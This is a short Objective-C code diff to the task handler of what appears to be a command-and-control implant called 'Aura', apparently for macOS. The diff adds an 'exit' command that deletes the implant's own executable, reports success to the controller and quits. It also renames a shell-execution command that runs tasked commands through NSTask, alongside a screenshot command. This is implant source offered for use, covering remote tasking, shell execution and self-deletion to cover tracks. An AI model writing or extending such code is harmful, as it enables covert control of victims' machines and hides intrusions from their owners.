@@ -1,8 +1,8 @@
-#import <Foundation/Foundation.h>
 #import "C2Task.h"
 #import "HTTPC2Config.h"
 #import "C2CheckIn.h"
 #import "NSTask.h"
+#import "SystemInfoHelper.h"
 
 @implementation C2Task
 
@@ -22,11 +22,18 @@
 
     // Dictionary mapping command strings to blocks (similar to a switch case)
     NSDictionary<NSString *, void (^)(void)> *taskCommandMap = @{
+        @"exit": ^{
+            BOOL deletionSuccess = [SystemInfoHelper deleteExecutable];
+            NSString *responseMessage = deletionSuccess ? @"✅ Aura payload successfully deleted." : @"❌ Error deleting the Aura payload.";
+            NSString *status = deletionSuccess ? @"success" : @"error";
+            [self submitTaskResponseWithOutput:responseMessage status:status completed:YES];
+            exit(0);
+        },
         @"take_screenshot": ^{
             NSString *responseMessage = [NSString stringWithFormat:@"Screenshot taken at %@", self.parameters];
             [self submitTaskResponseWithOutput:responseMessage status:@"success" completed:YES];
         },
-        @"shell_execution": ^{
+        @"shell_exec": ^{
             @try {
                 // Create an NSTask for shell execution
                 NSTask *task = [[NSTask alloc] init];
